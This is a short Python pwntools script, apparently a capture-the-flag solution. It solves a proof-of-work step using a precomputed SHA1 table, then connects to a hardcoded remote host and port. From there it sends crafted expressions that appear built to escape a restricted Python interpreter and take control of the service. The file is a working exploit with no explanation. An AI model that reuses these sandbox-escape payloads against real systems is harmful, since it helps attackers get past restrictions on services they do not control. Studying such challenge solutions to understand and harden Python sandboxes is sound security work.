import json
from pwn import *

table = {}
with open('4sha1.json', 'r') as f:
    table = json.loads(f.read())


p = remote('34.92.121.149', 54321)
code = p.recvline()[-6:-2]
p.sendline(table[code])
p.recvuntil('$')
p.sendline('[[reload][0]for[args]in[[sys]]][0]114514x')
p.recvline()
p.sendline(table[p.recvline()[-6:-2]])
p.recvuntil('$')
p.sendline('[[input][0]for[args]in[[session]]][0]114514x')
p.sendline('1')
print(p.recvline())
